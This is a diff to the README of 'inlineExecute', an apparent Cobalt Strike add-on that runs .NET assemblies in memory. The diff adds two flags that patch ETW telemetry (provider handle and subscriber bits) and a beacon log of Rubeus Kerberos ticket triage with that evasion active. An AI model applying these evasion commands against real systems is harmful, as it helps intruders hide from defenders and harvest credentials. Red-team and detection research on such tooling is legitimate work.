@@ -16,13 +16,13 @@ Load `inlineExecute.cna` from `Cobalt Strike -> Script Manager -> Load`. Ensure 
 
 ```shell
 beacon> inlineExecute
-[+] Usage: inlineExecute [-etw] [-verbose] <filepath> <args>
+[+] Usage: inlineExecute [-etwH] [-etwB] [-verbose] <filepath> <args>
 ```
 
-The `-etw` flag patches ETW in `clr.dll`.
+The `-etwH` and `-etwB` flags patches ETW via the Provider Handle Patching and Subscriber Bit Patching technique respectively. They can be used together or individually.
 
 ```
-inlineExecute -etw /home/kali/Tools/Ghostpack-CompiledBinaries/Rubeus.exe triage
+inlineExecute -etwH -etwB /home/kali/Tools/Ghostpack-CompiledBinaries/Rubeus.exe triage
 ```
 
 The `-verbose` flag outputs debugging information.
@@ -34,11 +34,62 @@ inlineExecute -verbose -etw /home/kali/Tools/Ghostpack-CompiledBinaries/Rubeus.e
 Example usage with `Rubeus.exe triage`.
 
 ```shell
-[11/29 04:08:35] beacon> inlineExecute -etw /home/kali/Tools/Ghostpack-CompiledBinaries/Rubeus.exe triage
-[11/29 04:08:35] [+] Executing: /home/kali/Tools/Ghostpack-CompiledBinaries/Rubeus.exe
-[11/29 04:08:35] [+] Arguments: triage
-[11/29 04:08:37] [+] host called home, sent: 459528 bytes
-[11/29 04:08:37] [+] received output:
+[12/02 22:26:17] beacon> inlineExecute -etwB -etwH -verbose /home/kali/Ghostpack-CompiledBinaries/Rubeus.exe triage
+[12/02 22:26:17] [+] Executing: /home/kali/Ghostpack-CompiledBinaries/Rubeus.exe
+[12/02 22:26:17] [+] Arguments: triage
+[12/02 22:26:17] [+] host called home, sent: 461058 bytes
+[12/02 22:26:17] [+] received output:
+[+] Runtime info obtained
+
+[12/02 22:26:17] [+] received output:
+[+] Runtime is loadable
+
+[12/02 22:26:17] [+] received output:
+[+] ICorRuntimeHost obtained
+
+[12/02 22:26:17] [+] received output:
+[+] CLR started successfully
+
+[12/02 22:26:17] [+] received output:
+[+] DotNETRuntimeHandle address: 00007FFEA4140930
+
+[12/02 22:26:17] [+] received output:
+[+] DotNETRuntimeHandle value: 7310c0
+
+[12/02 22:26:17] [+] received output:
+[+] DotNETRuntimeHandle patched: 1
+
+[12/02 22:26:17] [+] received output:
+[+] DotNETRuntimeEnableBits address: 00007FFEA41311C0
+
+[12/02 22:26:17] [+] received output:
+[+] DotNETRuntimeEnableBits value: ffffffff
+
+[12/02 22:26:17] [+] received output:
+[+] DotNETRuntimeEnableBits patched: 0
+
+[12/02 22:26:17] [+] received output:
+[+] clr.dll loaded: 00007FFEA36A0000
+
+[12/02 22:26:17] [+] received output:
+[+] Anonymous pipe created
+
+[12/02 22:26:17] [+] received output:
+[+] Console created and hidden
+
+[12/02 22:26:17] [+] received output:
+[+] Redirected stdout/stderr to pipe
+
+[12/02 22:26:17] [+] received output:
+[+] AppDomain Created
+
+[12/02 22:26:17] [+] received output:
+[+] Assembly Loaded
+
+[12/02 22:26:17] [+] received output:
+[+] Assembly executed, reading output...
+
+[12/02 22:26:17] [+] received output:
 
 
    ______        _                      
@@ -53,7 +104,7 @@ Example usage with `Rubeus.exe triage`.
 
 Action: Triage Kerberos Tickets (Current User)
 
-[*] Current LUID    : 0x1bc1b
+[*] Current LUID    : 0x1e563
 
  --------------------------------------- 
  | LUID | UserName | Service | EndTime |
@@ -61,7 +112,12 @@ Action: Triage Kerberos Tickets (Current User)
  --------------------------------------- 
 
 
+[12/02 22:26:17] [+] received output:
+[+] DotNETRuntimeHandle value restored: 7310c0
 
-[11/29 04:08:37] [+] received output:
+[12/02 22:26:17] [+] received output:
+[+] DotNETRuntimeEnableBits value restored: ffffffff
+
+[12/02 22:26:17] [+] received output:
 [+] Done
 ```
